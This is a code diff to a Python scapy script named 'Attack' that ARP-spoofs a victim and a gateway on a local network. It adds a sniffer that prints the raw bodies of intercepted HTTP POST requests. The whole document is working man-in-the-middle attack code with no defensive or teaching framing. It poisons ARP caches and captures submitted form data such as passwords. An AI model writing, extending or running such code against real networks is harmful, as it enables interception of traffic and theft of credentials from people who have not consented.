@@ -2,6 +2,7 @@
 import netifaces as ni
 import os
 import scapy.all as scapy
+from scapy.layers.http import HTTPRequest
 import time
 
 class Attack():
@@ -36,15 +37,29 @@ class Attack():
         packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
         scapy.send(packet,count=4,verbose=0)
 
+    def process_packet(self,packet):
+        if packet.haslayer(HTTPRequest):
+            method = packet[HTTPRequest].Method.decode()
+            if packet.haslayer(scapy.Raw) and method == "POST":
+                print("\nRaw Data: ", packet[scapy.Raw].load)
+        #scapy.send(packet,verbose=0)
+
+    def sniff_packet(self):
+        while 1:
+            scapy.sniff(filter="host "+self.victim, prn=self.process_packet, iface='ens33')
+            scapy.sniff(filter="host "+self.ap, prn=self.process_packet, iface='ens33')
+
     def arp_spoofing(self):
         while 1:
-            attack.spoof(self.victim, self.ap)
-            attack.spoof(self.ap, self.victim)
+            self.spoof(self.victim, self.ap)
+            self.spoof(self.ap, self.victim)
+            scapy.sniff(filter="host "+self.victim, prn=self.process_packet, iface='ens33')
+            scapy.sniff(filter="host "+self.ap, prn=self.process_packet, iface='ens33')
             time.sleep(1)
 
     def ret_arp_spoofing(self):
-        attack.restore(self.ap, self.victim)
-        attack.restore(self.victim, self.ap)
+        self.restore(self.ap, self.victim)
+        self.restore(self.victim, self.ap)
 
 attack = Attack()
 attack.get_ip()
@@ -52,6 +67,7 @@ attack.get_mac(attack.network[1])
 print(attack.ip_list, '\n', attack.ip_mac, '\n', attack.network)
 try:
     attack.arp_spoofing()
+    #attack.sniff_packet()
 except KeyboardInterrupt:
     attack.ret_arp_spoofing()
 
